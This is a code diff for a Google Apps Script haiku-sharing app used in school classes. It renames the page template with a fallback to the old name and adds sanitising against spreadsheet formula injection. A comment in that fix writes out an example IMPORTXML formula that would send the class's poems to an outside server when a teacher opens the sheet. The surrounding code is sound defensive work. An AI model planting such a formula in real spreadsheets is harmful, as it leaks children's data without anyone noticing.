@@ -53,22 +53,47 @@ function getDbSpreadsheet() {
 }
 
 /**
- * ほかの .html ファイルを index.html に差し込む。
+ * ほかの .html ファイルを外枠（app-shell）に差し込む。
  * GAS は .gs と .html しか置けないので、CSS も JavaScript も .html に包んで持つ。
  */
 function include(filename) {
   return HtmlService.createHtmlOutputFromFile(filename).getContent();
 }
 
+/**
+ * 外枠のファイル名。
+ *
+ * リポジトリでは app-shell.html という名前で持っている。もとは index.html
+ * だったが、それだと GitHub Pages（haiku-meeting.giga-school.com）が
+ * **GAS 用のテンプレートをそのまま配ってしまい、白い画面になる**。
+ * `<?!= include('app'); ?>` はブラウザには意味が無く、ただ捨てられるためである。
+ * いまトップに置いてあるのは導入案内のページで、そちらが index.html。
+ *
+ * ⚠️ 前の版を貼り付けた学級では、GAS 側のファイル名がまだ `index` のままである。
+ *    名前を変えただけで動かなくなると、授業中に画面が出なくなる。
+ *    新しい名前を先に探し、無ければ前の名前に落ちる。
+ */
+var SHELL_FILE_ = 'app-shell';
+var SHELL_FILE_LEGACY_ = 'index';
+
+function shellTemplate_() {
+  try {
+    return HtmlService.createTemplateFromFile(SHELL_FILE_);
+  } catch (e) {
+    // 貼り付けた版が古く app-shell が無い。前の名前で開く。
+    return HtmlService.createTemplateFromFile(SHELL_FILE_LEGACY_);
+  }
+}
+
 function doGet(e) {
   getDbSpreadsheet();
-  const template = HtmlService.createTemplateFromFile('index');
+  const template = shellTemplate_();
   return template.evaluate()
     .setTitle('GIGA句会プラザ')
     // 拡大は禁止しない。maximum-scale=1.0 と user-scalable=no を入れると、
     // 見えづらい子が画面を大きくできなくなる。
     // viewport-fit=cover は、切り欠きのある端末で安全領域を CSS から使うために要る。
-    // GAS は画面を iframe で包むため、index.html の <meta> だけでは足りず、ここにも要る。
+    // GAS は画面を iframe で包むため、app-shell.html の <meta> だけでは足りず、ここにも要る。
     .addMetaTag('viewport', 'width=device-width, initial-scale=1.0, viewport-fit=cover')
     .setFaviconUrl('https://drive.google.com/uc?id=14xzbLO7mLg2hy85PBQNnj0lir-gi2Uky.&png');
 }
@@ -220,13 +245,42 @@ function getArchiveData(sheetName) {
  * 俳句を1句ぶん記録する。
  * @param authorId 端末ごとの識別子。K列に残し、マイページで自分の作品を出すときに使う。
  */
+/**
+ * 表計算のセルに書く前に、児童の入力を「ただの文字」に落とす。
+ *
+ * ⚠️ appendRow / setValue に渡した文字列が = + - @ で始まっていると、
+ *    Google スプレッドシートはそれを**数式として保存する**。
+ *    たとえば上の句に
+ *
+ *      =IMPORTXML("https://example.com/?"&俳句!D2,"//x")
+ *
+ *    と書いて投稿されると、**先生がその表計算ファイルを開いた瞬間に**、
+ *    学級の句が外のサーバーへ送られる。児童の画面には何も起こらないし、
+ *    先生の画面にも「数式が入っている」以外の合図は出ない。
+ *    広場に並ぶのは投稿された文字そのものなので、見ても気づけない。
+ *
+ * 先頭に ' を足すと、その内容は文字として保存される。' は表示にも
+ * getValue() の戻り値にも現れないので、句もマイページの突き合わせも
+ * これまでどおり動く。
+ *
+ * タブ・改行で始まる文字列も、貼り付け時に列がずれる形になるので同じ扱いにする。
+ */
+function safeCellText_(value) {
+  if (value === null || value === undefined) return '';
+  var text = String(value);
+  if (text === '') return '';
+  return /^[=+\-@\t\r\n]/.test(text) ? "'" + text : text;
+}
+
 function submitHaiku(name, line1, line2, line3, authorId) {
   try {
     const ss = getDbSpreadsheet();
     const sheet = ss.getSheetByName('俳句');
     const haikuText = `${line1} ${line2} ${line3}`;
     const newId = new Date().getTime();
-    sheet.appendRow([newId, name, new Date(), haikuText, line1, line2, line3, 0, "", false, authorId || '']);
+    sheet.appendRow([newId, safeCellText_(name), new Date(), safeCellText_(haikuText),
+                     safeCellText_(line1), safeCellText_(line2), safeCellText_(line3),
+                     0, "", false, safeCellText_(authorId || '')]);
     return { success: true, name: name };
   } catch (e) { return { success: false, message: e.message }; }
 }
@@ -245,7 +299,7 @@ function submitVote(haikuId, score, voterId) {
     if (myVotes.some(row => row[2] == score)) throw new Error('その賞は既に投票済みです。');
     if (myVotes.some(row => row[1] == haikuId)) throw new Error('同じ作品には1回しか投票できません。');
 
-    voteSheet.appendRow([new Date(), haikuId, score, voterId]);
+    voteSheet.appendRow([new Date(), haikuId, score, safeCellText_(voterId)]);
     
     const haikuData = haikuSheet.getDataRange().getValues();
     for (let i = 1; i < haikuData.length; i++) {
@@ -262,7 +316,7 @@ function submitVote(haikuId, score, voterId) {
 function submitComment(haikuId, comment, commenterName) {
   try {
     const ss = getDbSpreadsheet();
-    ss.getSheetByName('コメント').appendRow([new Date(), haikuId, commenterName, comment]);
+    ss.getSheetByName('コメント').appendRow([new Date(), haikuId, safeCellText_(commenterName), safeCellText_(comment)]);
     return { success: true };
   } catch (e) { return { success: false, message: e.message }; }
 }
@@ -411,7 +465,7 @@ function updateSettings(token, theme, status) {
     const ss = getDbSpreadsheet();
     const settingsSheet = ss.getSheetByName('設定');
     const haikuSheet = ss.getSheetByName('俳句');
-    settingsSheet.getRange('A2').setValue(theme);
+    settingsSheet.getRange('A2').setValue(safeCellText_(theme));
     settingsSheet.getRange('B2').setValue(status);
 
     const lastRow = haikuSheet.getLastRow();
